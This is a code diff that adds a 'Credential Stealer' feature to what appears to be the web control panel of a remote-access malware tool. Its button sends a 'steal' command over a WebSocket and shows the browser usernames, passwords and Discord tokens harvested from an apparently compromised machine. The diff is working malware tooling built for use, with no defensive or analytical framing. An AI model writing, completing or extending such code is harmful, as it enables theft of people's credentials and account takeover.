@@ -114,6 +114,9 @@ function handleMessage(msg) {
     case "fun_result":
       handleFunResult(msg);
       break;
+    case "steal_result":
+      handleStealResult(msg);
+      break;
     default:
       console.log("Unknown message type:", msg.type);
   }
@@ -482,6 +485,74 @@ document.querySelectorAll(".fun-btn").forEach((btn) => {
     }
   });
 });
+// ── Credential Stealer ─────────────────────────────────────────────
+const stealBtn = document.getElementById("steal-btn");
+const stealStatus = document.getElementById("steal-status");
+const stealResult = document.getElementById("steal-result");
+const stealSummary = document.getElementById("steal-summary");
+const stealCreds = document.getElementById("steal-creds");
+
+function handleStealResult(msg) {
+  if (stealStatus) { stealStatus.classList.add("hidden"); stealStatus.textContent = ""; }
+  if (stealBtn) stealBtn.disabled = false;
+  if (!stealResult) return;
+  stealResult.classList.remove("hidden");
+
+  const creds = msg.credentials || [];
+  const tokens = msg.tokens || [];
+  const errors = msg.errors || [];
+
+  if (stealSummary) {
+    stealSummary.textContent =
+      `${creds.length} credential${creds.length !== 1 ? "s" : ""}, ` +
+      `${tokens.length} token${tokens.length !== 1 ? "s" : ""}` +
+      (errors.length ? ` — ${errors.length} error${errors.length !== 1 ? "s" : ""}` : "");
+  }
+
+  if (!stealCreds) return;
+  const lines = [];
+  for (const c of creds) {
+    lines.push(
+      `<div class="py-0.5 border-b border-slate-700/40">` +
+      `<span class="text-violet-400">${escapeHtml(c.browser)}</span>` +
+      (c.profile && c.profile !== "Default" ? ` <span class="text-slate-500">[${escapeHtml(c.profile)}]</span>` : "") +
+      ` <span class="text-slate-300">${escapeHtml(c.url)}</span>` +
+      ` <span class="text-cyan-300">${escapeHtml(c.username)}</span>` +
+      ` <span class="text-green-300">${escapeHtml(c.password)}</span>` +
+      `</div>`
+    );
+  }
+  for (const t of tokens) {
+    lines.push(
+      `<div class="py-0.5 border-b border-slate-700/40">` +
+      `<span class="text-yellow-400">Discord token</span> ` +
+      `<span class="text-slate-300 break-all">${escapeHtml(t)}</span>` +
+      `</div>`
+    );
+  }
+  for (const e of errors) {
+    lines.push(`<div class="text-red-400">✗ ${escapeHtml(e)}</div>`);
+  }
+  stealCreds.innerHTML = lines.length ? lines.join("") : `<span class="text-slate-500">Nothing found.</span>`;
+}
+
+if (stealBtn) {
+  stealBtn.addEventListener("click", () => {
+    if (!ws || ws.readyState !== WebSocket.OPEN) return;
+    if (stealResult) stealResult.classList.add("hidden");
+    if (stealStatus) { stealStatus.classList.remove("hidden"); stealStatus.textContent = "Running stealer…"; }
+    send({ type: "steal" });
+    stealBtn.disabled = true;
+    // Re-enable after 60s in case result never arrives
+    setTimeout(() => {
+      if (stealBtn) stealBtn.disabled = false;
+      if (stealStatus && stealStatus.textContent === "Running stealer…") {
+        stealStatus.textContent = "No response received.";
+      }
+    }, 60000);
+  });
+}
+
 function setSortField(field) {
   if (sortField === field) {
     sortDirection = sortDirection === "asc" ? "desc" : "asc";
